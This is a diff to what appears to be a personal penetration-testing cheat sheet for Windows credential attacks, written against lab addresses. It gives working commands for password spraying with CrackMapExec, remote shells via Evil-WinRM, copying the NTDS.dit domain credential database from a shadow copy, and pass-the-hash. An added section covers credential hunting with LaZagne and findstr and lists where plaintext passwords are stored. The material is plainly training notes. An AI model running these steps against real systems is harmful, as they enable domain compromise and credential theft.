@@ -71,8 +71,9 @@ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rocky
 ###  Launching the Attack with CrackMapExec
     crackmapexec smb 10.129.201.57 -u <username> -p /usr/share/wordlists/fasttrack.txt
 
-###  Connecting to a DC with Evil-WinRM
-    evil-winrm -i 10.129.201.57  -u <user> -p '<password>'
+###  Connecting to a DC with Evil-WinRM 
+# we have the winrm service open (port 5985,5986) 
+    evil-winrm -i 10.129.201.57  -u <user> -p '<password>' 
 
 ### Checking Local Group Membership
     net localgroup  # *Administrators
@@ -85,6 +86,7 @@ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rocky
     vssadmin CREATE SHADOW /For=C: # Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
 
 ###  Copying NTDS.dit from the VSS 
+    mkdir C:\NTDS
     cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit # copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
 
 ###  Transferring NTDS.dit to Attack Host
@@ -105,5 +107,37 @@ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rocky
 
 ### Pass-the-Hash Considerations    
 evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
+```
 
+## Credential Hunting in Windows
+```bash
+# Common terms to search for credentials :
+# Passwords,  Passphrases, Keys, Username, User, Creds, Users, Passkeys, Secrets, configuration, dbcredential, dbpassword, pwd, Login, Credentials.
+
+#  Search Tools:
+
+# With access to the GUI, it is worth attempting to use `Windows Search` to find files on the target using some of the keywords mentioned above.
+
+## Lazagne.exe (https://github.com/AlessandroZ/LaZagne/releases/)
+start lazagne.exe all
+
+# findstr 
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml *.ods
+
+# Credential Hunting - Places to Look
+
+- Passwords in Group Policy (GPP) within the SYSVOL share
+- Passwords in scripts stored in the SYSVOL share
+- Passwords in scripts located on IT/shared drives
+- Passwords in `web.config` files (commonly found on dev machines or IT shares)
+- `unattend.xml` files (often contain plaintext credentials)
+- Passwords stored in Active Directory (AD) user/computer description fields
+- KeePass database files
+  - Extract hash, crack it, and gain extensive access
+  - Typically found on user systems or shared drives
+- Common files with credentials:
+  - `pass.txt`
+  - `passwords.docx`
+  - `passwords.xlsx`
+  - Often located on user systems, shared drives, or SharePoint
 ```
